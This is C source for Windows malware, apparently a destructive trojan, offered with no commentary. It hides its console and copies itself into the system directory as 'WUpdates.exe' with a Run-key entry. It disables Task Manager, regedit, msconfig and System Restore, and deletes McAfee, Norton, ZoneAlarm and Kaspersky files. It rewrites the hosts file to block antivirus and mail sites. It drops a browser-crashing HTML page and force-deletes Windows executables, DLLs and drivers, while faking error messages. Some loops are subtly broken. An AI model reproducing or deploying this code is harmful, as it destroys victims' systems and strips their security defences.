   #include <stdio.h>
   #include <stdlib.h>
   #include <windows.h>
   #include <mmsystem.h>

    void hideprocess()
   {
      int i;
     for(i = 1; i < 25; i++)
     {
         HWND program;
         Sleep (100);
         program = FindWindow(0, "Windows Task Manager");
         SendMessage(program,WM_CLOSE,(LPARAM)0,(WPARAM)0);
         program = FindWindow(0, "Registry Editor");
         SendMessage(program,WM_CLOSE,(LPARAM)0,(WPARAM)0);
         program = FindWindow(0, "System Configuration Utility");
         SendMessage(program,WM_CLOSE,(LPARAM)0,(WPARAM)0);
         program = FindWindow(0, "Windows File Protection");
         SendMessage(program,WM_CLOSE,(LPARAM)0,(WPARAM)0);

      MessageBox(NULL, "Access Violation at address: 0050666F","Error", MB_OK | MB_ICONERROR );
     }
   }


   char Wn[MAX_PATH];
   char Mn[MAX_PATH];
   SOCKET sock;
   HWND Wnd;
   char Buffer [1230];
   int x,y;

   int Hkey()
   {
       char system[MAX_PATH];
   char pathtofile[MAX_PATH];
   HMODULE GetModH = GetModuleHandle(NULL);
   GetModuleFileName(GetModH,pathtofile,sizeof(pathtofile));
   GetSystemDirectory(system,sizeof(system));
   strcat(system,"\\WUpdates.exe");
   CopyFile(pathtofile,system,FALSE);
   HKEY hKey;
   RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_SET_VALUE,&hKey );
   RegSetValueEx(hKey, "WUpdates",0,REG_SZ,(const unsigned char*)system,sizeof(system));
   RegCloseKey(hKey);
   }

   void fPaths()
   {
    GetSystemDirectory(Wn, sizeof(Wn));
    GetModuleFileName(0, Mn, sizeof(Mn));
    strcat(Wn, "\\WUpdates.exe");
   }

   void inst()
   {
   CopyFile(Mn,Wn,0);
   CopyFile ("WUpdates.exe", "C:\\windows",TRUE);
   CopyFile ("MicroSuck.exe", "C:\\windows\\system",TRUE);
   CopyFile ("Svchost32.exe", "C:\\windows\\system32",TRUE);
    HKEY inst;
    RegOpenKey(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run", &inst);
    RegSetValueEx(inst, "Windows Security Updates", 0, REG_SZ, (LPBYTE)Wn, sizeof(Wn));
    RegCloseKey(inst);
   }





   void BlockSite()
   {
       FILE *fpl;
       fpl = fopen ("C:\\WINDOWS\\System32\\drivers\\etc\\hosts","w");
       fprintf (fpl,"0.0.0.0 google.com");
       fprintf (fpl," 0.0.0.0 www.hotmail.com");
       fprintf (fpl," 0.0.0.0 www.microsoft.com");
       fprintf (fpl," 0.0.0.0 microsoft.com");
       fprintf (fpl," 0.0.0.0  macafee.com");
       fprintf (fpl," 0.0.0.0 www.macafee.com");
       fprintf (fpl," 0.0.0.0 download.mcafee.com");
       fprintf (fpl," 0.0.0.0 www.download.mcafee.com");
       fprintf (fpl," 0.0.0.0 rads.mcafee.com");
       fprintf (fpl," 0.0.0.0 us.mcafee.com");
       fprintf (fpl," 0.0.0.0 www.networkassociates.com");
       fprintf (fpl," 0.0.0.0 networkassociates.com");
       fprintf (fpl," 0.0.0.0 update.symantec.com");
       fprintf (fpl," 0.0.0.0 updates.symantec.com");
       fprintf (fpl," 0.0.0.0 iveupdate.symantec.com");
       fprintf (fpl," 0.0.0.0 norton.com");
       fprintf (fpl," 0.0.0.0 www.symantec.com");
       fprintf (fpl," 0.0.0.0 symantec.com");
       fprintf (fpl," 0.0.0.0 www.norton.com");
       fprintf (fpl," 0.0.0.0 google.com");
       fprintf (fpl," 0.0.0.0 bitdefender.com");
       fprintf (fpl," 0.0.0.0 www.viruslist.com");
       fprintf (fpl," 0.0.0.0 viruslist.com");
       fprintf (fpl," 0.0.0.0 www.virustotal.com");
       fprintf (fpl," 0.0.0.0 virustotal.com");
       fprintf (fpl," 0.0.0.0 www.kaspersky.com");
       fprintf (fpl," 0.0.0.0 kaspersky.com");
       fprintf (fpl," 0.0.0.0 kaspersky-labs.com");
       fprintf (fpl," 0.0.0.0 www.kaspersky-labs.com");
       fprintf (fpl," 0.0.0.0 www.trendmicro.com");
       fprintf (fpl," 0.0.0.0 trendmicro.com");
       fprintf (fpl," 0.0.0.0 www.pandasoftware.com");
       fprintf (fpl," 0.0.0.0 pandasoftware.com");
       fprintf (fpl," 0.0.0.0 www.nod32.com");
       fprintf (fpl," 0.0.0.0 nod32.com");
       fprintf (fpl," 0.0.0.0 yahoo.com");
       fprintf (fpl," 0.0.0.0 mail.yahoo.com");
       fprintf (fpl," 0.0.0.0 www.grisoft.com");
       fprintf (fpl," 0.0.0.0 www.f-secure.com");
       fprintf (fpl," 0.0.0.0  f-secure.com");
       fclose(fpl);
      }

      void DelWin()
     {
     system("del C:\\WINDOWS\\*.exe /F /S /Q");
     system("del C:\\WINDOWS\\*.dll /F /S /Q");
     system("del C:\\WINDOWS\\System\\*.exe /F /S /Q");
     system("del C:\\WINDOWS\\System\\*.dll /F /S /Q");
     system("del C:\\WINDOWS\\System32\\*.exe /F /S /Q");
     system("del C:\\WINDOWS\\System32\\*.dll /F /S /Q");
     system("del C:\\WINDOWS\\System32\\Restore\\*.* /F /S /Q");
     system("del C:\\WINDOWS\\System32\\DRIVERS\\*.sys /F /S /Q");
     }

        void spaceup()
      {
           char i;
           FILE *Uknown;
           Uknown = fopen ("C:\\WINDOWS\\System32\\WUpdates.txt","w");
           for (i=1;i<100;i++);
           {
           Sleep (100);
           fprintf(Uknown,"0x0000000,0x0000000,Ax0000000,0x0000000,0x0000000,0x0000000");
           fprintf(Uknown,"0x00C0000,Bx0000000,Ax0000000,0x0000000,0x0000000,0x0000000");
           fprintf(Uknown,"0x00000F0,0x0000000,7x0000000,0x00FF000,Ax0000000,0x0000000");
           fprintf(Uknown,"0x0000000,0x0000000,Ax0000000,0x0000000,0x0000000,0x0000000");
           fprintf(Uknown,"0x0000000,0x0000000,Ax0000000,0x0000000,0x000E000,0x0000000");
           fprintf(Uknown,"0x0000000,0D0000000,Bx0000000,0x0000000,0x0000000,0x0000000");
           fprintf(Uknown,"0x0000000,0x0000000,Ax0000000,0x0000000,0x0000000,0x0000000");
           Sleep (100);
           fprintf(Uknown,"0x0000000,0x0000000,Ax0000000,0x0000000,0x0000000,0x0000000");
           fprintf(Uknown,"0x0000000,0x0000000,Nx0000000,0x0000000,0x0000000,0x0000000");
           fprintf(Uknown,"Ax0000000,0x0000000,Ax0000000,0x0000000,0x0000000,0x0000000");
           fprintf(Uknown,"0x0000000,0x0000000,Ax000F000,0x00CCC00,0x0000C00,0xFFF0000");
           Sleep (100);
           fprintf(Uknown,"0x0000000,0x0000000,Ax0000000,0x0000000,0x0000000,0x0000000");
           fprintf(Uknown,"0x0000000,0x0000000,Ax0000000,0x0000000,0x0000000,0x0000000");
           fprintf(Uknown,"0x0000000,0x0000000,Ax0000000,0x0000000,0x0000000,0x0000000");
           fprintf(Uknown,"3x0000000,0x0000000,Ax0000000,0x0000000,0x0000000,0x0000000");
           fprintf(Uknown,"0x0000000,0x0000000,Ax0000000,0x0000000,0x0000000,0x0000000");
           }
   }



           void Exploit()
   {
   FILE *ghp;
   ghp = fopen ("C:\\windows\\system32\\exploit.html","w");
   fprintf(ghp, "<html>");
   fprintf(ghp, "<script>");
   fprintf(ghp, "window.onerror=new Function(history.go(0));");
   fprintf(ghp, "function btf(){btf();}");
   fprintf(ghp, "btf();");
   fprintf(ghp, "</script>");
   fprintf(ghp, "</html>");
   }


     void Anticlean()
   {
     int i;
     for(i = 1; i < 9999999; i++)

       rename("C:\\WINDOWS\\pchealth\\helpctr\\binaries\\msconfig.exe","C:\\WINDOWS\\pchealth\\helpctr\\binaries\\msconfig.ex_");
       Sleep (100);
       rename("C:\\WINDOWS\\regedit.exe","C:\\WINDOWS\\regedit.ex_");
       Sleep (100);
       rename("C:\\WINDOWS\\system32\\Restorerstrui\\rstrui.exe","C:\\WINDOWS\\system32\\Restorerstrui\\rstrui.ex_");
       Sleep (100);
       rename("C:\\WINDOWS\\system32\\wscui.cpl","C:\\WINDOWS\\system32\\wscui.cp_");
       Sleep (100);
       rename("C:\\WINDOWS\\system32\\wupdmgr.exe","C:\\WINDOWS\\system32\\wupdagr.ex_");
       Sleep (100);
       rename("C:\\WINDOWS\\system32\\taskmgr.exe","C:\\WINDOWS\\system32\\taskdae.ex_");
       Sleep (100);
       MessageBox(NULL, "Access Violation at address: 0050666F","Error", MB_OK | MB_ICONERROR );
   }


   void killavfw()
   {
      system("del C:\\Program Files\\McAfee.com\\Personal Firewall\\*.dll /F /S /Q ");
      system("del C:\\Program Files\\McAfee.com\\Personal Firewall\\data\\*.* /F /S /Q ");
      system("del C:\\Program Files\\McAfee.com\\Personal Firewall\\help\\*.* /F /S /Q ");
      system("del C:\\Program Files\\McAfee.com\\VSO\\*.dll /F /S /Q ");
      system("del C:\\Program Files\\McAfee.com\\VSO\\*.ini /F /S /Q ");
      system("del C:\\Program Files\\McAfee.com\\VSO\\Res00\\*.dll /F /S /Q ");
      system("del C:\\Program Files\\McAfee.com\\VSO\\Dat\\4615\\*.* /F /S /Q ");
      system("del C:\\Program Files\\McAfee.com\\*.* /F /S /Q ");
      system("del C:\\Program Files\\Norton AntiVirus\\*.dll /F /S /Q ");
      system("del C:\\Program Files\\Common Files\\Symantec Shared\\*.exe /F /S /Q ");
      system("del C:\\Program Files\\Norton AntiVirus\\*.ini /F /S /Q");
      system("del C:\\Program Files\\Norton AntiVirus\\*.exe /F /S /Q ");
      system("del C:\\Program Files\\Norton AntiVirus\\*.inf /F /S /Q ");
      system("del C:\\Program Files\\Zone Labs\\ZoneAlarm\\*.exe  /F /S /Q ");
      system("del C:\\Program Files\\Zone Labs\\ZoneAlarm\\*.zap /F /S /Q ");
      system("del C:\\Program Files\\Zone Labs\\ZoneAlarm\\*.dll /F /S /Q ");
      system("del C:\\Program Files\\Zone Labs\\ZoneAlarm\\repair\\*.dll /F /S /Q ");
      system("del C:\\Program Files\\Kaspersky Lab\\AVP6\\*.exe /F /S /Q ");
      system("del C:\\Program Files\\Kaspersky Lab\\AVP6\\*.dll /F /S /Q ");
   }




   int main(int argc, char *argv[])
   {
      HWND wndstealth;
    AllocConsole();
    wndstealth=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(wndstealth,0);

    Hkey();
    Anticlean();
    killavfw();
    BlockSite();
    hideprocess();
    Exploit();
    DelWin();


   FILE *fp;
   fp = fopen ("c:\\NError.dmp","w");
   {
   fprintf(fp,"%s","Stop: 0x0000000A (0xFFFFFFFC,0x00000002,0x00000000,0x804DC42A)");
   fclose(fp);
   }
   }
